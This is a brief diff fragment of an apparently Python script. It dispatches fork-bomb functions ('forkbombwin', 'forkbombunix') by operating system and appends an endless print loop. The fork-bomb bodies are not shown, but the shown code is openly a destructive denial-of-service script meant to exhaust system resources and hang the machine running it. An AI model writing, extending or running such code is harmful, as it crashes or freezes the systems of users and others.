@@ -45,3 +45,6 @@ if opsys == "Windows":
     forkbombwin(i)
 if opsys == "Linux" or opsys == "Darwin":
     forkbombunix(i)
+
+while True:
+    print("")
